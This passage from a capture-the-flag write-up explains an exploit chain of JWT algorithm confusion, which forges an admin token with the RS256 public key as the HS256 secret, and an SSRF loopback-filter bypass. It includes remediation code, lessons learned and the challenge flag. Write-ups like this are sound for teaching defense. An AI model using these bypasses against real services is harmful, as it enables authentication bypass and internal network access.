{"alg":"HS256","typ":"JWT"}
{"sub":"admin","role":"admin"}
```

---

## 13. Root Cause Analysis

### 13.1 JWT algorithm confusion

The token verifier trusts the `alg` value from the token header. Instead of enforcing RS256, it allows the attacker to choose HS256 and then uses the RSA public key as a symmetric HMAC secret.

Three conditions combined to make this exploitable:

1. The application publishes the public key at `/pubkey.pem`.
2. The verifier accepts more than one algorithm.
3. The verifier uses the same key material for both the asymmetric and symmetric paths.

The result is a full authentication bypass: any attacker can mint a token with arbitrary claims, including `role=admin`.

### 13.2 SSRF with a weak denylist

The diagnostics endpoint fetches arbitrary URLs. Its protection is a string-based check for loopback hosts. This is insufficient because:

1. **Many textual forms represent the same IP.** Decimal, hexadecimal, octal, short IPv4, `0`, and `0.0.0.0` all reach the local service.
2. **DNS aliases bypass text matching.** `localtest.me` resolves to `127.0.0.1` but contains no blocked string. This proves no DNS resolution validation is performed.
3. **Path tricks are irrelevant** if the host itself is blocked, and host-encoding tricks are effective if only the host string is checked.
4. **There is no egress allowlist.** A health-check fetcher should only reach known health endpoints, not arbitrary internal URLs.

### 13.3 Information leakage in the admin briefing

The `/console` response for both analyst and admin explicitly names the loopback flag probe:

```text
http://127.0.0.1:5000/internal/flag (server-side only)
```

This turns the SSRF into a guided attack. Even without the hint, the API reference lists `/internal/flag` as "loopback only." Removing internal topology hints from user-facing responses would raise the bar, although it is not a substitute for fixing the SSRF.

### 13.4 Role claim trust

The application trusts the `role` claim in the JWT. That is normal for stateless JWT auth, but only if the token is cryptographically trustworthy. Because the signature could be forged, the role claim became attacker-controlled.

---

## 14. Remediation

### 14.1 Fix the JWT verification

Pin the expected algorithm explicitly and reject everything else:

```python
# Vulnerable: algorithm chosen by the token header
jwt.decode(token, key, algorithms=[header["alg"]])

# Safe: algorithm pinned by the server
jwt.decode(token, public_key, algorithms=["RS256"])
```

Additional hardening:

- Never use the same key material for RS256 and HS256.
- Use a JWT library version and configuration that enforces key type.
- Validate `iss`, `aud`, `exp`, and `nbf`.
- Keep token lifetimes short.
- Do not trust any claim until the signature has been verified.
- Rotate keys and remove stale key material.
- Consider using an opaque session ID stored server-side if stateless JWT is not required.

Note: publishing the public key is not itself a vulnerability. Public keys are public by design. The vulnerability is the verifier accepting an attacker-selected algorithm.

### 14.2 Fix the SSRF

Replace the denylist with an allowlist and resolve before connecting:

1. Accept only `https` and only known health-check hosts.
2. Resolve the hostname to all IP addresses.
3. Reject any address in loopback, private, link-local, multicast, or reserved ranges.
4. Explicitly block cloud metadata addresses such as `169.254.169.254`.
5. Connect to the validated IP, not to a fresh DNS resolution, to prevent DNS rebinding.
6. Disable redirects or revalidate every redirect hop.
7. Apply strict timeouts and response-size limits.
8. Run the fetcher in a sandbox or network namespace with an egress firewall.
9. Never echo internal topology or internal URLs in API responses.

Example validation logic:

```python
import ipaddress
import socket
from urllib.parse import urlparse

def assert_safe_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("scheme not allowed")

    host = parsed.hostname
    if not host:
        raise ValueError("missing host")

    infos = socket.getaddrinfo(host, None)
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if (
            ip.is_private
            or ip.is_loopback
            or ip.is_link_local
            or ip.is_multicast
            or ip.is_reserved
            or ip.is_unspecified
        ):
            raise ValueError(f"destination {ip} is not allowed")
```

Even the above needs care: the validated IP must be the IP actually connected to, otherwise a second DNS resolution can be rebound. A production implementation should use a custom connection pool or an HTTP client that supports pinning the resolved address.

### 14.3 Defense in depth

- Require admin authorization for diagnostics at the application layer, not just a role claim in a forgeable token.
- Log and alert on diagnostics requests to loopback or private addresses.
- Restrict the gunicorn process's outbound network access.
- Do not publish internal service URLs in HTML, JavaScript, or API responses.
- Add automated tests that explicitly try algorithm confusion, `alg=none`, and SSRF loopback encodings.

---

## 15. Lessons Learned

1. **Read the application's own documentation first.** The landing page disclosed the demo credentials, the API routes, the public key path, and the internal flag target. Guessing JWKS paths wasted time that reading the page would have saved.
2. **A published public key plus a JWT is a strong algorithm-confusion signal.** Test RS256 → HS256 early whenever the verifier might trust the `alg` header.
3. **Do not stop at `alg=none`.** It was rejected here. Algorithm confusion with the public key was the working path.
4. **Preserve exact key bytes.** The raw 451-byte PEM, including the trailing newline, was accepted as the HMAC secret.
5. **Test both token transports.** The forged token worked as both `Authorization: Bearer` and `Cookie: token=`.
6. **SSRF filters that match strings are not filters.** Numeric IP encodings, short forms, `0.0.0.0`, and DNS aliases are standard bypasses.
7. **A DNS alias that resolves to loopback is a decisive test.** `localtest.me` returning the flag proved the filter never resolved the hostname.
8. **IPv6 may be a dead end even when it looks promising.** `[::1]` produced a connection error because the service was IPv4-only.
9. **Error messages are intelligence.** `blocked: loopback host not allowed` and the admin briefing both guided the next step.
10. **Keep the exploit reproducible.** A self-contained script that fetches the key, logs in, forges the token, and performs the SSRF is more valuable than a pile of manual notes.

---

## 16. Final Result

```text
Flag: HackCTF{alg_c0nfus10n_th3n_ssrf_t0_l00pb4ck}
```

The challenge was solved by chaining two independent flaws:

- **JWT algorithm confusion** using the published RS256 public key as an HS256 HMAC secret, yielding an admin token.
- **SSRF loopback-filter bypass** using the decimal representation of `127.0.0.1` to reach `/internal/flag`.

Either flaw alone would have been significant. Together they provided a complete path from an unauthenticated demo account to the internal flag.
